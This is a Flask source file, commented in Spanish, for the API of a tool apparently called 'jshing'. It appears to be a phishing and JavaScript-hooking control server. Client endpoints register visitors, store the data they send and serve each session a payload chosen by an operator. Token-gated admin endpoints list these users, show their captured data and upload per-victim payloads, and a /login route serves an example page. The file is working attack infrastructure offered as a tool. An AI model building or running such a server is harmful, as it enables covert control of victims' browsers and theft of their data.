from flask import Flask, redirect, request, session, abort, render_template_string, render_template
from sys import argv
import bdd, os


# Si se esta ejecutando desde jshing se envia un parametro llamado start_api para identificarle
if "start_api" in argv:
    
    # Se elimina el parametro nuevo y asignamos los valores a las variables correespondientes
    argv.remove("start_api")

    if len(argv) != 4:
        print("""
    ##############################################################################

        ¿Eres desarrollador? Para utilizar esto es necesario ejecutar api.py 
        enviando los parametros IP, PUERTO, TOKEN DE AUTORIZACION DE JSHING
            el cual se provee en jshing.py la seccion de start_api

            Ejemplo: python api.py 0.0.0.0 8081 token_ejemplo_jshing
            
    ##############################################################################
    """)
        exit(0)

    # 0 Nombre de archivo
    # 1 IP
    # 2 Puerto
    # 3 Token
    nombre_archivo, ip_flask, port_flask, token_flask = argv

else:
    token_flask = os.getenv("SECRET_KEY_JSHING")

app = Flask(__name__)
app.config["SECRET_KEY"] = token_flask

@app.after_request
def add_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "http://127.0.0.1:3000" # ATENTO MODIFICAR EN CASO DE DEJAR EN SERVIDOR FUERA DE LOCAL
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response

@app.before_request
def verify_token():

    unautorized = "<h1>No Autorizado</h1><img src='data:image/webp;base64,UklGRqoDAABXRUJQVlA4WAoAAAAgAAAAMAAAVgAASUNDUMgBAAAAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAAABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADZWUDggvAEAAJAOAJ0BKjEAVwA/OYi5Vq8opSOtVN0h4CcJaQAAWUfuxt5Q3r67azFaZSLDw4/8bYnu9IFzDTlT1BQVRKWhQ9twH7H/T7cGEai/xETrsLK+FnfHVa3A9NSX3RnUWU3Sz3n45yvhmkIz73dnNspJOnqii39DfD5GLfQv3NcAAM4HvqJX2H2nLIKSk/gkpsdcq6UCXUfbeIHwTt13faPsoP4uKE0n/vkRGHb15LW+6zCw5EEq8Pl+sPmUOxBjnELh0YX4gSXTht2YnuCpx0hUe2UhouXtZ0XDazdDLT69ZmteqXwbMTLk84vaOcuAXzVFnyG1CF7VvG5oSe0oFs6iujO7plOQzRdYfKNB/GUxdIcdxT5sPU94XM/JMEuhgBUrs8/00qP/jqCNM/upuBHp65wrFJMpQg8W6hBoKLmTRLY4GagWCV0IEziG5NmCpwYDMPzWp/0Z5+hU3480S3f7JiTYBCrRHwgWK512VwNw1bPvvAG/oxq7ZwpaX2NLQQtfjr1RyRPZ4aAjCoxf3SyviE5hjYqgMFsxO213E2YFpboi5gDWWNAOnWxCoZoH8zlhKzBpKlevg4yPJwAAAA==' width='300'>"

    """ 
    if "/api/v2/" not in request.base_url: # Mejorar validacion
        return render_template_string(unautorized)"""
    
    # Si la ruta consultada no es admin, continua con la ejecucion normal
    if "admin" in request.base_url:
        # En caso de ser admin pedira el token de autorizacion generado en el backend
        token_get = request.headers.get("token")
        if not token_get or token_get != token_flask:
            return render_template_string(unautorized)


#########################################################
@app.route("/api/v2/user/dinamic", methods = ["GET", "POST"])
def subir_obtener_info():
    
    if request.method == "GET":

        if not session or "uuid_m" not in session:
            return bdd.response_json(401, "bad request")

        return bdd.obtener_payload_cliente(session["uuid_m"])
    
    ################## EL USUARIO MALICIOSO UNICAMENTE TIENE 1 ENDPOINT
    # REDUCIENDO SU POSIBILIDAD DE INTERACTUAR CON EL OTRO ENDPOINT UNICAMENTE
    # CON LA KEY GENERADA POR PARTE DEL ADMIN

    data_user = request.get_data(as_text=True)
    if not data_user.endswith(" ") and len(data_user) <= 4000:
        return bdd.response_json(500, "internal error")

    registrar_usuario = bdd.registrar_usuario_m(data_user)
    if registrar_usuario["status"] == 500:
        return registrar_usuario

    print(registrar_usuario)

    session["uuid_m"] = registrar_usuario["data"]
    return bdd.response_json(200, "success")

######################################################### ADMIN ZONA

@app.route("/api/v2/admin/malicius_users", methods = ["GET", "POST"])
def obtener_usuarios():

    if request.method == "POST":

        request_json = request.get_json()
        if "uuid_m" not in request_json:
            return bdd.response_json(400, "bad request")
        
        return bdd.obtener_info_usuario_malicioso(request_json["uuid_m"])

    ############## ZONA GET ES TODOS USUARIOS

    return bdd.obtener_usuarios_maliciosos()

@app.route("/api/v2/admin", methods = ["GET"])
def obtener_endpoints():
    
    endpoints = []
    for rules in app.url_map.iter_rules():
        endpoints.append({"endpoint": rules.rule, "methods": list(rules.methods)})

    return bdd.response_json(200, endpoints)

@app.route("/api/v2/admin/upload_payload", methods = ["POST"])
def subir_payload():
    
    json_request = request.get_json()
    if any(x not in json_request for x in ["uuid_m", "payload"]):
        return bdd.response_json(400, "bad request")
    
    return bdd.insertar_payload(json_request["uuid_m"], json_request["payload"])

@app.route("/login", methods = ["GET", "POST"])
def test_jshing():
    return render_template("example.html")

if __name__ == "__main__":
    app.run(ip_flask, port_flask, True)